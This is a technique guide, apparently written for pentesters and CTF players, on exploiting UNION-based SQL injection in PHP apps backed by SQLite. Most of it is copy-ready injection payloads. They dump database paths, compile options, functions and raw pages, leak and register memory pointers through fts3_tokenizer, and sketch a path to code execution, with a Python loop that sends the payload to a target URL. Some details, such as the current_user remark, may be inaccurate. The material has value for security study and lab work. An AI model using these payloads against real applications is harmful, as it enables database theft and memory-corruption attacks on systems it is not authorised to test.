# SQLite SQLi — deep dive (PHP `SQLite3::query()` context)

When you've confirmed a UNION-based SQLi against a PHP+SQLite app, here's the full enumeration and escalation tree. Tested on SQLite 3.46.x, PHP 8.4 built-in dev server.

## 1. Enumeration via `pragma_*` virtual tables

These are vastly more useful than `sqlite_master` alone:

```sql
-- DB file path on disk (tells you webroot)
' UNION SELECT 1, name, file, 4, 5 FROM pragma_database_list --

-- All compile-time options (look for ENABLE_LOAD_EXTENSION,
-- ENABLE_FTS3_TOKENIZER, ENABLE_DBSTAT_VTAB, SECURE_DELETE)
' UNION SELECT 1, group_concat(compile_options,'|'),
                  group_concat(compile_options,'|'), 4, 5
  FROM pragma_compile_options --

-- All callable SQL functions (find load_extension, readfile, writefile, etc.)
' UNION SELECT 1, group_concat(name,'|'),
                  group_concat(name,'|'), 4, 5
  FROM pragma_function_list --

-- All registered virtual-table modules (fts3, fts5, dbstat, sqlite_dbpage…)
' UNION SELECT 1, group_concat(name,'|'),
                  group_concat(name,'|'), 4, 5
  FROM pragma_module_list --

-- Security-relevant pragmas
' UNION SELECT 1, 'writable_schema='||(SELECT * FROM pragma_writable_schema()),
                  'trusted_schema='  ||(SELECT * FROM pragma_trusted_schema()), 4, 5 --
```

`sqlite_dbpage` lets you read raw pages — useful for finding deleted tuples
that `SECURE_DELETE` didn't actually wipe:

```sql
' UNION SELECT 1, substr(hex(data), 1, 600),
                  substr(hex(data), 1, 600), 4, 5
  FROM sqlite_dbpage WHERE pgno=1 --
```

## 2. Why "obvious" RCE/file-read paths fail

| Attempt | Result on PHP+SQLite default | Why |
|---|---|---|
| `load_extension('libsqlite3_fileio.so')` | `Warning: SQLite3::query(): Unable to execute statement: not authorized` | PHP's `SQLite3` registers a default authorizer that denies `SQLITE_FUNCTION` for `load_extension`. Cannot be turned off from SQL. |
| `readfile()` / `writefile()` | Function not present | These come from the CLI `fileio` extension, not built-in. Confirm with `pragma_function_list`. |
| Stacked queries (`'; ATTACH …; --`) | First statement runs, rest silently dropped (no error) | `SQLite3::query()` calls `sqlite3_prepare_v2` and runs only the first statement. Multi-statement requires `SQLite3::exec()` which most apps don't use for SELECTs. |
| Subquery `ATTACH` | Syntax error | `ATTACH` is a top-level statement, not allowed inside SELECT. |
| `INSERT INTO sqlite_master …` | Blocked unless `PRAGMA writable_schema=1` is on (default 0) | Even then, you need stacked queries to set the pragma. |

**Net result:** in default PHP+SQLite, SQLi gives you full DB read but **no easy
RCE or arbitrary file read**. Most CTF labs that look like "PHP+SQLite SQLi" are
**vuln-identification exercises**, not pwn challenges. Verify by checking the
DB contents — if there's no creds/flag table, the lab is asking you to *describe*
the bug, not exfil a flag.

## 3. The hard-mode RCE primitive: `fts3_tokenizer`

If `ENABLE_FTS3_TOKENIZER` is in `pragma_compile_options`, the
`fts3_tokenizer(name [, ptr_blob])` function is callable from SELECT:

```sql
-- Leak: returns the real libsqlite3 tokenizer struct address as a blob
' UNION SELECT 1, hex(fts3_tokenizer('simple')), 'x', 4, 5 --

-- Register: second arg is treated as `sqlite3_tokenizer_module *` —
-- arbitrary pointer, no validation. Subsequent CREATE VIRTUAL TABLE …
-- USING fts3(tokenize=name) will call (*ptr->xCreate)(argc, argv, ppTok).
' UNION SELECT 1, fts3_tokenizer('cve', x'4141414141414141'), 'x', 4, 5 --
```

The error message after the second call (`Unable to execute statement: AAAAAAAA`)
confirms the pointer was registered and the address (truncated) leaks back —
this is the CVE-2019-8457-class primitive.

**To weaponize:** point `xCreate` at a libc gadget so the call to
`xCreate(int nArg, const char *const *azArg, sqlite3_tokenizer **ppTok)`
becomes useful. Direct `xCreate = system` doesn't work — `system`'s rdi is
the int `nArg`, not a string. Need a small JOP gadget that pivots rdi → rsi
or moves an `azArg[0]`-controlled string into rdi.

This is real exploit-dev (libsqlite leak → libc base → gadget find → fake
struct). **Hours of work and version-fragile** — confirm the lab actually
expects RCE before going down this path.

### ASLR detection via address stability

If you leak an address via `fts3_tokenizer('simple')`, test if ASLR is disabled:

```python
# Make 5 requests and compare leaked addresses
for i in range(5):
    payload = "' UNION SELECT 1, hex(fts3_tokenizer('simple')), 'x', 4, 5 --"
    r = requests.get(url, params={'search': payload})
    ptr = extract_hex_from_response(r.text)  # Your extraction logic
    print(f"Request {i}: 0x{ptr:x}")
```

If all 5 addresses are identical, **ASLR is disabled** — addresses are stable
and you can compute offsets without a fresh leak per-exploit. If they vary,
you need a leak-and-exploit in the same request (not possible with `SQLite3::query()`
since tokenizer registration doesn't persist).

### PHP connection-per-request: tokenizer doesn't persist

Critical blocker: **each HTTP request creates a fresh `SQLite3` connection**.
Even if `fts3_tokenizer('mytok', x'...')` succeeds in one request, a subsequent
request cannot use `mytok` — it was registered in a connection that's now closed.

This means you **cannot register a tokenizer and trigger it in a separate request**.
You would need stacked queries (`; CREATE VIRTUAL TABLE ...`) to register-and-trigger
in one statement — but `SQLite3::query()` blocks stacked queries.

Even if the target has `ENABLE_FTS3_TOKENIZER`, **no pre-existing FTS tables** in
`sqlite_master` means there's no trigger mechanism. The primitive is real but
cannot be weaponized in a single-statement SQLi context.

## 4. Telltale signs you're injecting into a `LIKE '%…%'` (not `=`)

When your payload `MARKER\x00POSTFIX` produces *two distinct fragments* in
parser errors (e.g. `near "'%MARKER"` from one and `near "POSTFIX%'"` from the
other), the original query interpolates `$search` into **two LIKE clauses**:

```sql
WHERE name LIKE '%' || $search || '%' OR description LIKE '%' || $search || '%'
```

That's not a second injection point — it's the same payload reflected twice.
Only one of the two fragments needs to terminate cleanly; comment out the rest
with `--` (the other fragment ends up inside the comment).

## 5. Pragmas worth reading early

```
' UNION SELECT 1, sqlite_version(), sqlite_version(), 4, 5 --
' UNION SELECT 1, hex(randomblob(0)) , 'x', 4, 5 --     -- proves expr eval
' UNION SELECT 1, current_timestamp, current_user, 4, 5 --
```

`current_user` is `NULL` on stock SQLite (no concept of users), but some
applications redefine it — worth a shot.
